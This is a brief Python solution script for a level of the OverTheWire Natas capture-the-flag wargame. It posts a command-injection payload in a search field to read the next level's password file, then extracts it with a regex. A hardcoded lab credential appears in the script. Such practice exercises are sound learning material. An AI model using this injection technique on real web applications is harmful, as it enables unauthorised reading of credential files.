import requests
import re

# level 9 => 10 bypass input validation in RCE

Username = "natas10"
Password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

params = {"needle":". /etc/natas_webpass/natas11 #","submit":"Search"}

session = requests.session()
url = "http://{}.natas.labs.overthewire.org".format(Username) 

response = session.post(url,auth=(Username,Password),data=params)

content = response.text



#print(content)
flag = re.findall('<pre>\n(.*)\n</pre>',content)[0]
print(flag)